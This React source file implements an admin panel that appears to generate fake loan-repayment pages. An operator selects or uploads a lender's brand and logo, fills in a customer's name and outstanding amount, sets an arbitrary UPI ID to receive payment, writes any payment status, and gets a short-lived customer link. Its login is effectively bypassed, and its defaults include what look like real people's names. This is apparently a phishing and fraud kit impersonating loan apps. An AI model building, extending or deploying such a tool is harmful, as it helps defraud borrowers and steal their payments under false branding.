import React, { useState } from 'react';
import { LoanOrder } from '../utils/loan';

export interface AdminConfig {
  appName: string;
  appLogo: string;
  customerName: string;
  bankAddress: string;
  remainingAmount: number;
  loanAmount: number;
  paidAmount: number;
  dueDate: string;
  receivedDate: string;
  upiId: string;
  utrIcon: 'review' | 'failed' | 'success';
  utrStatus: string;
  linkTimeMinutes: number;
}

interface AdminPanelProps {
  currentConfig: AdminConfig;
  onUpdateConfig: (newConfig: AdminConfig) => void;
  onApplyAndOpenCustomer: (newConfig: AdminConfig) => void;
  onCloseAdmin: () => void;
}

export const AdminPanel: React.FC<AdminPanelProps> = ({
  currentConfig,
  onUpdateConfig,
  onApplyAndOpenCustomer,
  onCloseAdmin,
}) => {
  const [isLoggedIn, setIsLoggedIn] = useState(true);
  const [adminId, setAdminId] = useState('faysal');
  const [adminPassword, setAdminPassword] = useState('••••••••');
  const [loginError, setLoginError] = useState('');

  // Form states matching screenshots
  const [appName, setAppName] = useState(currentConfig.appName || 'Zen Money');
  const [selectedLogo, setSelectedLogo] = useState(currentConfig.appLogo || 'Zen Money');
  const [showAddLogo, setShowAddLogo] = useState(false);
  const [newLogoName, setNewLogoName] = useState('');
  const [newLogoUrl, setNewLogoUrl] = useState('');

  const [availableLogos, setAvailableLogos] = useState([
    { name: 'Zen Money', icon: 'zen', url: '' },
    { name: 'Karta Loan', icon: 'karta', url: '' },
    { name: 'Rupee Express', icon: 'rupee', url: '' },
    { name: 'Pocket Credit', icon: 'pocket', url: '' },
    { name: 'Nova Loan', icon: 'nova', url: '' },
    { name: 'Trust Wallet', icon: 'trust', url: '' },
  ]);

  const [customerName, setCustomerName] = useState(currentConfig.customerName || 'BHAVIK KAMLESH SANGHVI');
  const [remainingAmount, setRemainingAmount] = useState(currentConfig.remainingAmount || 12540);
  const [loanAmount, setLoanAmount] = useState(currentConfig.loanAmount || 11000);
  const [paidAmount, setPaidAmount] = useState(currentConfig.paidAmount || 0);
  const [dueDate, setDueDate] = useState(currentConfig.dueDate || '2026-11-02');

  const [upi, setUpi] = useState(currentConfig.upiId || 'paytm.s3u8921@pty');
  const [utrIcon, setUtrIcon] = useState<'review' | 'failed' | 'success'>(currentConfig.utrIcon || 'review');
  const [utrStatus, setUtrStatus] = useState(currentConfig.utrStatus || 'Under Review');

  const [linkTime, setLinkTime] = useState(currentConfig.linkTimeMinutes || 10);
  const [createdResult, setCreatedResult] = useState<{
    link: string;
    linkTime: number;
    expiresAt: string;
  } | null>(null);

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    if (!adminId.trim() || !adminPassword.trim()) {
      setLoginError('Admin ID এবং Password প্রদান করুন');
      return;
    }
    setLoginError('');
    setIsLoggedIn(true);
  };

  const handleSaveNewLogo = () => {
    if (!newLogoName.trim()) return;
    const newEntry = {
      name: newLogoName.trim(),
      icon: 'custom',
      url: newLogoUrl.trim(),
    };
    setAvailableLogos((prev) => [newEntry, ...prev]);
    setSelectedLogo(newEntry.name);
    setAppName(newEntry.name);
    setNewLogoName('');
    setNewLogoUrl('');
    setShowAddLogo(false);
  };

  const handleCreateCustomer = (e: React.FormEvent) => {
    e.preventDefault();
    const expiry = new Date(Date.now() + linkTime * 60 * 1000);
    const dateFormatted = `${expiry.getFullYear()}-${String(expiry.getMonth() + 1).padStart(2, '0')}-${String(expiry.getDate()).padStart(2, '0')} ${String(expiry.getHours()).padStart(2, '0')}:${String(expiry.getMinutes()).padStart(2, '0')}:${String(expiry.getSeconds()).padStart(2, '0')}`;
    const randomId = 'f4abb' + Math.random().toString(36).substring(2, 12);

    const newConfig: AdminConfig = {
      appName,
      appLogo: selectedLogo,
      customerName,
      bankAddress: 'HDFC BANK, ANDHERI (W), MUMBAI',
      remainingAmount: Number(remainingAmount),
      loanAmount: Number(loanAmount),
      paidAmount: Number(paidAmount),
      dueDate,
      receivedDate: '23-10-2026',
      upiId: upi,
      utrIcon,
      utrStatus,
      linkTimeMinutes: Number(linkTime),
    };

    onUpdateConfig(newConfig);

    setCreatedResult({
      link: `customer.php?id=${randomId}`,
      linkTime,
      expiresAt: dateFormatted,
    });
  };

  // Login view matching image_33c71ebd.png
  if (!isLoggedIn) {
    return (
      <div className="min-h-screen bg-[#f4f6f9] flex flex-col items-center justify-center p-4 font-sans select-none">
        <div className="w-full max-w-[400px] bg-white rounded-2xl shadow-xl p-8 text-center border border-gray-100">
          <div className="w-16 h-16 mx-auto rounded-2xl bg-amber-100/70 flex items-center justify-center mb-4">
            <svg className="w-10 h-10 text-amber-500" viewBox="0 0 24 24" fill="currentColor">
              <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z" />
            </svg>
          </div>

          <h2 className="text-2xl font-bold text-gray-900 tracking-tight mb-1">
            Admin Login
          </h2>
          <p className="text-sm text-gray-500 mb-6">
            Please enter your Admin ID and Password
          </p>

          <form onSubmit={handleLogin} className="space-y-4 text-left">
            <div>
              <label className="block text-xs font-semibold text-gray-700 mb-1">
                Admin ID
              </label>
              <input
                type="text"
                value={adminId}
                onChange={(e) => setAdminId(e.target.value)}
                placeholder="faysal"
                className="w-full px-3.5 py-2.5 rounded-lg border border-indigo-200 bg-indigo-50/20 text-gray-900 text-sm focus:outline-none focus:ring-2 focus:ring-indigo-500"
              />
            </div>

            <div>
              <label className="block text-xs font-semibold text-gray-700 mb-1">
                Password
              </label>
              <input
                type="password"
                value={adminPassword}
                onChange={(e) => setAdminPassword(e.target.value)}
                placeholder="••••••••"
                className="w-full px-3.5 py-2.5 rounded-lg border border-indigo-200 bg-indigo-50/20 text-gray-900 text-sm focus:outline-none focus:ring-2 focus:ring-indigo-500"
              />
            </div>

            {loginError && <p className="text-xs text-red-500">{loginError}</p>}

            <button
              type="submit"
              className="w-full py-3 rounded-lg bg-[#3b49df] hover:bg-[#2f3bc0] text-white font-semibold text-sm cursor-pointer shadow-md transition-all active:scale-[0.98]"
            >
              Login
            </button>
          </form>

          <div className="mt-6 flex items-center justify-between text-xs text-gray-400">
            <span>Admin access only</span>
            <button
              type="button"
              onClick={onCloseAdmin}
              className="text-indigo-600 hover:underline cursor-pointer"
            >
              Return to App
            </button>
          </div>
        </div>
      </div>
    );
  }

  // Dashboard / Create Customer matching image_c63fb2a9.png, image_c54c4006.png, image_5b497fd5.png, image_1976fec1.png
  return (
    <div className="min-h-screen bg-[#f3f4f8] py-6 px-3 flex justify-center font-sans text-gray-800">
      <div className="w-full max-w-md bg-white rounded-2xl shadow-sm border border-gray-100 p-5 space-y-4">
        {/* Top Header */}
        <div className="flex items-center justify-between pb-2 border-b border-gray-100">
          <div>
            <h1 className="text-xl font-bold text-gray-900">Create Customer</h1>
            <p className="text-xs text-gray-400">Full Site &amp; Repayment Control Dashboard</p>
          </div>
          <div className="flex items-center gap-2">
            <button
              type="button"
              onClick={onCloseAdmin}
              className="text-xs bg-indigo-50 text-indigo-700 font-semibold px-2.5 py-1 rounded-md hover:bg-indigo-100 cursor-pointer"
            >
              Customer App View
            </button>
            <button
              type="button"
              onClick={() => setIsLoggedIn(false)}
              className="text-xs bg-red-50 text-red-600 font-semibold px-2.5 py-1 rounded-md hover:bg-red-100 cursor-pointer"
            >
              Logout
            </button>
          </div>
        </div>

        <form onSubmit={handleCreateCustomer} className="space-y-4 text-sm">
          {/* Section 1: Customer Information */}
          <div className="bg-gray-50/60 p-4 rounded-xl border border-gray-200/70 space-y-3">
            <h3 className="font-bold text-gray-900 text-[14.5px]">Customer Information</h3>

            <div>
              <label className="block text-xs font-semibold text-gray-600 mb-1">
                App Name
              </label>
              <input
                type="text"
                value={appName}
                onChange={(e) => setAppName(e.target.value)}
                placeholder="Zen Money / Karta Loan"
                className="w-full px-3 py-2 bg-white border border-gray-300 rounded-lg text-sm text-gray-800 outline-none focus:border-indigo-500"
              />
            </div>

            <div>
              <label className="block text-xs font-semibold text-gray-600 mb-1">
                App Logo
              </label>
              <select
                value={selectedLogo}
                onChange={(e) => {
                  setSelectedLogo(e.target.value);
                  setAppName(e.target.value);
                }}
                className="w-full px-3 py-2 bg-white border border-gray-300 rounded-lg text-sm text-gray-800 outline-none focus:border-indigo-500"
              >
                {availableLogos.map((l) => (
                  <option key={l.name} value={l.name}>
                    {l.name}
                  </option>
                ))}
              </select>
            </div>

            <button
              type="button"
              onClick={() => setShowAddLogo(!showAddLogo)}
              className="w-full py-2 bg-indigo-50 text-indigo-700 font-semibold text-xs rounded-lg hover:bg-indigo-100 cursor-pointer border border-indigo-100 transition-colors"
            >
              + Add New Logo
            </button>

            {/* Add New Logo Drawer / Accordion */}
            {showAddLogo && (
              <div className="p-3 bg-white border border-indigo-200 rounded-lg space-y-2.5">
                <div className="font-semibold text-xs text-gray-700">Add New Logo</div>
                <div>
                  <label className="block text-[11px] text-gray-500 mb-1">New Logo Name</label>
                  <input
                    type="text"
                    value={newLogoName}
                    onChange={(e) => setNewLogoName(e.target.value)}
                    placeholder="Example: My New App"
                    className="w-full px-2.5 py-1.5 border border-gray-300 rounded text-xs outline-none"
                  />
                </div>
                <div>
                  <label className="block text-[11px] text-gray-500 mb-1">New Logo URL</label>
                  <input
                    type="text"
                    value={newLogoUrl}
                    onChange={(e) => setNewLogoUrl(e.target.value)}
                    placeholder="https://example.com/logo.jpg"
                    className="w-full px-2.5 py-1.5 border border-gray-300 rounded text-xs outline-none"
                  />
                </div>
                <button
                  type="button"
                  onClick={handleSaveNewLogo}
                  className="w-full py-2 bg-indigo-600 text-white font-semibold text-xs rounded hover:bg-indigo-700 cursor-pointer"
                >
                  Save New Logo
                </button>
              </div>
            )}

            {/* Logo Preview */}
            <div className="p-2.5 bg-white rounded-lg border border-gray-200 flex items-center justify-between">
              <div className="flex items-center gap-2">
                <div className="w-8 h-8 rounded-lg bg-teal-600 text-white font-bold flex items-center justify-center text-xs">
                  {selectedLogo.slice(0, 2).toUpperCase()}
                </div>
                <span className="font-semibold text-xs text-gray-800">{selectedLogo}</span>
              </div>
              <span className="text-[10px] text-gray-400">Total logos available: {availableLogos.length}</span>
            </div>

            <div>
              <label className="block text-xs font-semibold text-gray-600 mb-1">
                Customer Name
              </label>
              <input
                type="text"
                value={customerName}
                onChange={(e) => setCustomerName(e.target.value)}
                placeholder="KRISHNA ANAND MANNIKERI"
                className="w-full px-3 py-2 bg-white border border-gray-300 rounded-lg text-sm text-gray-800 outline-none focus:border-indigo-500 uppercase"
              />
            </div>

            <div>
              <label className="block text-xs font-semibold text-gray-600 mb-1">
                Remaining Amount
              </label>
              <input
                type="number"
                value={remainingAmount}
                onChange={(e) => setRemainingAmount(Number(e.target.value))}
                placeholder="0"
                className="w-full px-3 py-2 bg-white border border-gray-300 rounded-lg text-sm text-gray-800 outline-none focus:border-indigo-500 font-mono"
              />
              <p className="text-[11px] text-gray-400 mt-1">Customer page-এ এই amount দেখানো হবে।</p>
            </div>

            <div className="grid grid-cols-2 gap-2">
              <div>
                <label className="block text-xs font-semibold text-gray-600 mb-1">
                  Loan Amount
                </label>
                <input
                  type="number"
                  value={loanAmount}
                  onChange={(e) => setLoanAmount(Number(e.target.value))}
                  placeholder="0"
                  className="w-full px-3 py-2 bg-white border border-gray-300 rounded-lg text-sm text-gray-800 outline-none focus:border-indigo-500 font-mono"
                />
              </div>
              <div>
                <label className="block text-xs font-semibold text-gray-600 mb-1">
                  Paid Amount
                </label>
                <input
                  type="number"
                  value={paidAmount}
                  onChange={(e) => setPaidAmount(Number(e.target.value))}
                  placeholder="0"
                  className="w-full px-3 py-2 bg-white border border-gray-300 rounded-lg text-sm text-gray-800 outline-none focus:border-indigo-500 font-mono"
                />
              </div>
            </div>

            <div>
              <label className="block text-xs font-semibold text-gray-600 mb-1">
                Due Date
              </label>
              <input
                type="date"
                value={dueDate}
                onChange={(e) => setDueDate(e.target.value)}
                className="w-full px-3 py-2 bg-white border border-gray-300 rounded-lg text-sm text-gray-800 outline-none focus:border-indigo-500"
              />
            </div>
          </div>

          {/* Section 2: Payment Information */}
          <div className="bg-gray-50/60 p-4 rounded-xl border border-gray-200/70 space-y-3">
            <h3 className="font-bold text-gray-900 text-[14.5px]">Payment Information</h3>

            <div>
              <label className="block text-xs font-semibold text-gray-600 mb-1">
                UPI
              </label>
              <input
                type="text"
                value={upi}
                onChange={(e) => setUpi(e.target.value)}
                placeholder="Example: example@upi"
                className="w-full px-3 py-2 bg-white border border-gray-300 rounded-lg text-sm text-gray-800 outline-none focus:border-indigo-500 font-mono"
              />
            </div>

            <div>
              <label className="block text-xs font-semibold text-gray-600 mb-1">
                UTR Submit Icon
              </label>
              <select
                value={utrIcon}
                onChange={(e) => setUtrIcon(e.target.value as any)}
                className="w-full px-3 py-2 bg-white border border-gray-300 rounded-lg text-sm text-gray-800 outline-none focus:border-indigo-500"
              >
                <option value="review">⚠️ — Under Review</option>
                <option value="failed">❌ — Failed</option>
                <option value="success">✅ — Success / Paid</option>
              </select>
            </div>

            {/* Icon Preview */}
            <div className="p-2.5 bg-white rounded-lg border border-gray-200 flex items-center gap-2 text-xs font-medium text-gray-700">
              {utrIcon === 'review' && <span className="text-amber-500 font-bold text-base">⚠️</span>}
              {utrIcon === 'failed' && <span className="text-red-500 font-bold text-base">❌</span>}
              {utrIcon === 'success' && <span className="text-emerald-500 font-bold text-base">✅</span>}
              <span>Selected UTR Submit Icon</span>
            </div>

            <div>
              <label className="block text-xs font-semibold text-gray-600 mb-1">
                UTR Submit Status
              </label>
              <input
                type="text"
                value={utrStatus}
                onChange={(e) => setUtrStatus(e.target.value)}
                placeholder="Under Review"
                className="w-full px-3 py-2 bg-white border border-gray-300 rounded-lg text-sm text-gray-800 outline-none focus:border-indigo-500"
              />
              <p className="text-[11px] text-gray-400 mt-1">এখানে নিজের মতো যেকোনো status লিখতে পারবে।</p>
            </div>
          </div>

          {/* Section 3: Link Settings */}
          <div className="bg-gray-50/60 p-4 rounded-xl border border-gray-200/70 space-y-3">
            <h3 className="font-bold text-gray-900 text-[14.5px]">Link Settings</h3>

            <div>
              <label className="block text-xs font-semibold text-gray-600 mb-1">
                Link Time (Minutes)
              </label>
              <input
                type="number"
                value={linkTime}
                onChange={(e) => setLinkTime(Number(e.target.value))}
                min="1"
                max="43200"
                className="w-full px-3 py-2 bg-white border border-gray-300 rounded-lg text-sm text-gray-800 outline-none focus:border-indigo-500 font-mono"
              />
            </div>

            <div className="p-3 bg-white rounded-lg border border-gray-200 text-xs text-gray-500 space-y-1">
              <p>Default is 10 minutes.</p>
              <p className="text-gray-600">তুমি চাইলে নিজের মতো minutes দিতে পারবে। Maximum 30 days.</p>
            </div>

            <div className="p-2.5 bg-indigo-50/70 rounded-lg text-xs font-medium text-indigo-700">
              Link will expire after {linkTime} minutes.
            </div>
          </div>

          {/* Create Button */}
          <button
            type="submit"
            className="w-full py-3.5 bg-[#3b49df] hover:bg-[#2f3bc0] active:scale-[0.98] text-white font-bold text-sm rounded-xl cursor-pointer shadow-md transition-all text-center"
          >
            Create Customer
          </button>
        </form>

        {/* Success Card Matching image_1976fec1.png */}
        {createdResult && (
          <div className="p-4 bg-emerald-50 border border-emerald-200 rounded-xl space-y-2 text-xs animate-in fade-in">
            <div className="font-bold text-emerald-800 text-sm">
              Customer created successfully!
            </div>
            <div>
              <span className="font-semibold text-gray-700">Customer Link:</span>
              <br />
              <button
                type="button"
                onClick={() => {
                  const updated: AdminConfig = {
                    appName,
                    appLogo: selectedLogo,
                    customerName,
                    bankAddress: 'HDFC BANK, ANDHERI (W), MUMBAI',
                    remainingAmount: Number(remainingAmount),
                    loanAmount: Number(loanAmount),
                    paidAmount: Number(paidAmount),
                    dueDate,
                    receivedDate: '23-10-2026',
                    upiId: upi,
                    utrIcon,
                    utrStatus,
                    linkTimeMinutes: Number(linkTime),
                  };
                  onApplyAndOpenCustomer(updated);
                }}
                className="text-indigo-600 font-semibold underline hover:text-indigo-800 break-all cursor-pointer text-left mt-1"
              >
                {createdResult.link} (Click to open Customer View)
              </button>
            </div>
            <div className="text-gray-600">
              <span className="font-semibold">Link Time:</span> {createdResult.linkTime} minutes
            </div>
            <div className="text-gray-600 font-mono">
              <span className="font-semibold">Expires At:</span> {createdResult.expiresAt}
            </div>

            <button
              type="button"
              onClick={() => {
                const updated: AdminConfig = {
                  appName,
                  appLogo: selectedLogo,
                  customerName,
                  bankAddress: 'HDFC BANK, ANDHERI (W), MUMBAI',
                  remainingAmount: Number(remainingAmount),
                  loanAmount: Number(loanAmount),
                  paidAmount: Number(paidAmount),
                  dueDate,
                  receivedDate: '23-10-2026',
                  upiId: upi,
                  utrIcon,
                  utrStatus,
                  linkTimeMinutes: Number(linkTime),
                };
                onApplyAndOpenCustomer(updated);
              }}
              className="mt-2 w-full py-2 bg-emerald-700 hover:bg-emerald-800 text-white font-bold rounded-lg cursor-pointer text-center"
            >
              🚀 Launch Customer View with this Config
            </button>
          </div>
        )}
      </div>
    </div>
  );
};
